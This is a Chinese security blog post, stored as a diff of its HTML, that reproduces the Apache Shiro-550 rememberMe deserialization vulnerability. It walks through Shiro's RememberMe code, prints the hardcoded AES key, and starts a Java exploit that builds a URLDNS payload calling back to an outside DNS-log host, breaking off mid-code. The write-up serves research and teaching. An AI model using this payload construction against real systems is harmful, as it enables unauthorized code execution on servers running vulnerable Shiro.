@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Shiro-550漏洞复现 | zoiltin&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Shiro-550漏洞复现">
+<meta name="author" content="">
+<link rel="canonical" href="https://zoiltin.github.io/posts/shiro-550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://zoiltin.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://zoiltin.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://zoiltin.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://zoiltin.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://zoiltin.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://zoiltin.github.io/posts/shiro-550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:url" content="https://zoiltin.github.io/posts/shiro-550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+  <meta property="og:site_name" content="zoiltin&#39;s Blog">
+  <meta property="og:title" content="Shiro-550漏洞复现">
+  <meta property="og:description" content="Shiro-550漏洞复现">
+  <meta property="og:locale" content="zh-CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-26T10:48:20+00:00">
+    <meta property="article:modified_time" content="2025-03-26T10:48:20+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Shiro-550漏洞复现">
+<meta name="twitter:description" content="Shiro-550漏洞复现">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://zoiltin.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Shiro-550漏洞复现",
+      "item": "https://zoiltin.github.io/posts/shiro-550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Shiro-550漏洞复现",
+  "name": "Shiro-550漏洞复现",
+  "description": "Shiro-550漏洞复现",
+  "keywords": [
+    
+  ],
+  "articleBody": "本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\n基础知识 组件 Shiro有三大核心组件，即Subject、SecurityManager 和 Realm\nSubject: 认证主体。Subject代表了当前的用户。包含Principals和Credentials两个信息。 SecurityManager：安全管理员。是Shiro架构的核心。与Subject的所有交互都会委托给SecurityManager，它负责与Shiro 的其他组件进行交互。 Realm：域。Shiro从Realm中获取安全数据（如用户、角色、权限），就是说SecurityManager要验证用户身份，那么它需要从Realm中获取相应的用户进行比较，来确定用户的身份是否合法 一些概念：\nAuthentication: 身份认证、登录，验证用户是不是拥有相应的身份; Authorization：鉴权，验证某个已认证的用户是否拥有某个权限 Session Manager: 会话管理 Cryptography: 加密,保护数据的安全性 Concurrency: Shiro支持多线程应用的并发验证，即，如在一个线程中开启另一个线程,能把权限自动的传播过去 Remember Me：会话保存 配置 web.xml，shiro通过filter进行注入。\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e ",
+  "wordCount" : "1125",
+  "inLanguage": "en",
+  "datePublished": "2025-03-26T10:48:20Z",
+  "dateModified": "2025-03-26T10:48:20Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://zoiltin.github.io/posts/shiro-550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zoiltin's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://zoiltin.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://zoiltin.github.io/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://zoiltin.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Shiro-550漏洞复现
+    </h1>
+    <div class="post-description">
+      Shiro-550漏洞复现
+    </div>
+    <div class="post-meta"><span title='2025-03-26 10:48:20 +0000 UTC'>March 26, 2025</span>&nbsp;·&nbsp;6 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" aria-label="基础知识">基础知识</a><ul>
+                        
+                <li>
+                    <a href="#%e7%bb%84%e4%bb%b6" aria-label="组件">组件</a></li>
+                <li>
+                    <a href="#%e9%85%8d%e7%bd%ae" aria-label="配置">配置</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" aria-label="漏洞分析">漏洞分析</a></li>
+                <li>
+                    <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%88%a9%e7%94%a8%e9%93%be" aria-label="反序列化利用链">反序列化利用链</a><ul>
+                        
+                <li>
+                    <a href="#cc%e9%93%be%e6%94%b9%e9%80%a0" aria-label="CC链改造">CC链改造</a></li>
+                <li>
+                    <a href="#cb%e9%93%be%e6%94%b9%e9%80%a0" aria-label="CB链改造">CB链改造</a></li>
+                <li>
+                    <a href="#rmi%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="RMI反序列化">RMI反序列化</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e7%bb%95%e8%bf%87header%e9%95%bf%e5%ba%a6%e9%99%90%e5%88%b6" aria-label="绕过Header长度限制">绕过Header长度限制</a><ul>
+                        
+                <li>
+                    <a href="#post%e4%bc%a0%e5%8f%82" aria-label="POST传参">POST传参</a></li>
+                <li>
+                    <a href="#%e5%88%86%e6%ae%b5%e4%bc%a0%e8%be%93" aria-label="分段传输">分段传输</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%8f%82%e8%80%83" aria-label="参考">参考</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><strong>本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。</strong></p>
+<h1 id="基础知识">基础知识<a hidden class="anchor" aria-hidden="true" href="#基础知识">#</a></h1>
+<h2 id="组件">组件<a hidden class="anchor" aria-hidden="true" href="#组件">#</a></h2>
+<p>Shiro有三大核心组件，即Subject、SecurityManager 和 Realm</p>
+<ul>
+<li>Subject: 认证主体。Subject代表了当前的用户。包含Principals和Credentials两个信息。</li>
+<li>SecurityManager：安全管理员。是Shiro架构的核心。与Subject的所有交互都会委托给SecurityManager，它负责与Shiro 的其他组件进行交互。</li>
+<li>Realm：域。Shiro从Realm中获取安全数据（如用户、角色、权限），就是说SecurityManager要验证用户身份，那么它需要从Realm中获取相应的用户进行比较，来确定用户的身份是否合法</li>
+</ul>
+<p>一些概念：</p>
+<ul>
+<li>Authentication: 身份认证、登录，验证用户是不是拥有相应的身份;</li>
+<li>Authorization：鉴权，验证某个已认证的用户是否拥有某个权限</li>
+<li>Session Manager: 会话管理</li>
+<li>Cryptography: 加密,保护数据的安全性</li>
+<li>Concurrency: Shiro支持多线程应用的并发验证，即，如在一个线程中开启另一个线程,能把权限自动的传播过去</li>
+<li>Remember Me：会话保存</li>
+</ul>
+<h2 id="配置">配置<a hidden class="anchor" aria-hidden="true" href="#配置">#</a></h2>
+<p><code>web.xml</code>，shiro通过filter进行注入。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;web-app</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://java.sun.com/xml/ns/javaee&#34;</span> <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">xsi:schemaLocation=</span><span style="color:#e6db74">&#34;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&#34;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;2.5&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;listener&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;listener-class&gt;</span>org.apache.shiro.web.env.EnvironmentLoaderListener<span style="color:#f92672">&lt;/listener-class&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/listener&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;filter&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;filter-name&gt;</span>ShiroFilter<span style="color:#f92672">&lt;/filter-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;filter-class&gt;</span>org.apache.shiro.web.servlet.ShiroFilter<span style="color:#f92672">&lt;/filter-class&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/filter&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;filter-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;filter-name&gt;</span>ShiroFilter<span style="color:#f92672">&lt;/filter-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;url-pattern&gt;</span>/*<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/filter-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;welcome-file-list&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;welcome-file&gt;</span>index.jsp<span style="color:#f92672">&lt;/welcome-file&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/welcome-file-list&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/web-app&gt;</span>
+</span></span></code></pre></div><p><code>shiro.ini</code>用于配置具体权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#66d9ef">[main]</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">shiro.loginUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/login.jsp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[users]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># format: username = password, role1, role2, ..., roleN</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">root</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">secret,admin</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">guest</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">guest,guest</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">presidentskroob</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">12345,president</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">darkhelmet</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">ludicrousspeed,darklord,schwartz</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lonestarr</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">vespa,goodguy,schwartz</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[roles]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># format: roleName = permission1, permission2, ..., permissionN</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">admin</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">schwartz</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">lightsaber:*</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">goodguy</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">winnebago:drive:eagle5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[urls]</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">/login.jsp</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">authc</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">/logout</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">logout</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">/account/**</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">authc</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">/remoting/**</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">authc, roles[b2bClient], perms[&#34;remote:invoke:lan,wan&#34;]</span>
+</span></span></code></pre></div><h1 id="漏洞分析">漏洞分析<a hidden class="anchor" aria-hidden="true" href="#漏洞分析">#</a></h1>
+<p>影响版本为 <code>shiro 1.x &lt; 1.2.5</code></p>
+<p>接口 <code>org.apache.shiro.mgt.RememberMeManager</code>定义了<code>getRememberedPrincipals</code>方法用于在指定上下文中找到记住的 principals，也就是 RememberMe 的功能。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">RememberMeManager</span> {
+</span></span><span style="display:flex;"><span>    PrincipalCollection <span style="color:#a6e22e">getRememberedPrincipals</span>(SubjectContext var1);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">forgetIdentity</span>(SubjectContext var1);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onSuccessfulLogin</span>(Subject var1, AuthenticationToken var2, AuthenticationInfo var3);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onFailedLogin</span>(Subject var1, AuthenticationToken var2, AuthenticationException var3);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onLogout</span>(Subject var1);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>AbstractRememberMeManager</code>是<code>RememberMeManager</code>的一个抽象实现类</p>
+<p>其实现的<code>getRememberedPrincipals</code>方法代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> PrincipalCollection <span style="color:#a6e22e">getRememberedPrincipals</span>(SubjectContext subjectContext) {
+</span></span><span style="display:flex;"><span>    PrincipalCollection principals <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getRememberedSerializedIdentity</span>(subjectContext);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (bytes <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> bytes.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> 0) {
+</span></span><span style="display:flex;"><span>            principals <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">convertBytesToPrincipals</span>(bytes, subjectContext);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (RuntimeException var4) {
+</span></span><span style="display:flex;"><span>        principals <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">onRememberedPrincipalFailure</span>(var4, subjectContext);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> principals;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>会调用<code>getRememberedSerializedIdentity</code>获取序列化的<code>principals</code>，<code>CookieRememberMeManager</code>类实现了这个方法，代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">getRememberedSerializedIdentity</span>(SubjectContext subjectContext) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        .............
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            HttpServletRequest request <span style="color:#f92672">=</span> WebUtils.<span style="color:#a6e22e">getHttpRequest</span>(wsc);
+</span></span><span style="display:flex;"><span>            HttpServletResponse response <span style="color:#f92672">=</span> WebUtils.<span style="color:#a6e22e">getHttpResponse</span>(wsc);
+</span></span><span style="display:flex;"><span>            String base64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getCookie</span>().<span style="color:#a6e22e">readValue</span>(request, response);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#34;deleteMe&#34;</span>.<span style="color:#a6e22e">equals</span>(base64)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (base64 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>                base64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">ensurePadding</span>(base64);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (log.<span style="color:#a6e22e">isTraceEnabled</span>()) {
+</span></span><span style="display:flex;"><span>                    log.<span style="color:#a6e22e">trace</span>(<span style="color:#e6db74">&#34;Acquired Base64 encoded identity [&#34;</span> <span style="color:#f92672">+</span> base64 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;]&#34;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> decoded <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">decode</span>(base64);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (log.<span style="color:#a6e22e">isTraceEnabled</span>()) {
+</span></span><span style="display:flex;"><span>                    log.<span style="color:#a6e22e">trace</span>(<span style="color:#e6db74">&#34;Base64 decoded byte array length: &#34;</span> <span style="color:#f92672">+</span> (decoded <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> decoded.<span style="color:#a6e22e">length</span> : 0) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; bytes.&#34;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> decoded;
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>获取Cookie中<code>rememberMe</code>字段的值并base64解码，传给<code>AbstractRememberMeManager#convertBytesToPrincipals</code>方法。代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> PrincipalCollection <span style="color:#a6e22e">convertBytesToPrincipals</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes, SubjectContext subjectContext) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getCipherService</span>() <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        bytes <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">decrypt</span>(bytes);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">deserialize</span>(bytes);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>先进行解密再反序列化。</p>
+<p>加解密相关代码定义在<code>AbstractRememberMeManager</code>类中，使用AES-128-CBC算法。
+<img alt="1" loading="lazy" src="/posts/shiro-550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/1.png"></p>
+<p>KEY硬编码在<code>AbstractRememberMeManager</code>中。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> DEFAULT_CIPHER_KEY_BYTES <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">decode</span>(<span style="color:#e6db74">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span>);
+</span></span></code></pre></div><p>触发DNSLOG：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exp</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        URLDNS urldns <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URLDNS();
+</span></span><span style="display:flex;"><span>        Object expobj <span style="color:#f92672">=</span> urldns.<span style="color:#a6e22e">getObject</span>(<span style="color:#e6db74">&#34;http://log.c37af96d-ec4e-43e4-8bd3-3c347d9eb7b8.dnshook.site&#34;</span>);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(ser(expobj));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">encrypt</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data, <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> key) {
+</span></span><span style="display:flex;"><span>        CipherService cipherService <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AesCipherService();
+</span></span><span style="display:flex;"><span>        ByteSource byteSource <span style="color:#f92672">=</span> cipherService.<span style="color:#a6e22e">encrypt</span>(data, key);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> value <span style="color:#f92672">=</span> byteSource.<span style="color:#a6e22e">getBytes</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> value;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">ser</span>(Object obj) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream byteArrayOutputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream objectOutputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(byteArrayOutputStream);
+</span></span><span style="display:flex;"><span>        objectOutputStream.<span style="color:#a6e22e">writeObject</span>(obj);
+</span></span><span style="display:flex;"><span>        objectOutputStream.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> encrypted <span style="color:#f92672">=</span> encrypt(byteArrayOutputStream.<span style="color:#a6e22e">toByteArray</span>(), Base64.<span style="color:#a6e22e">decode</span>(KEY));
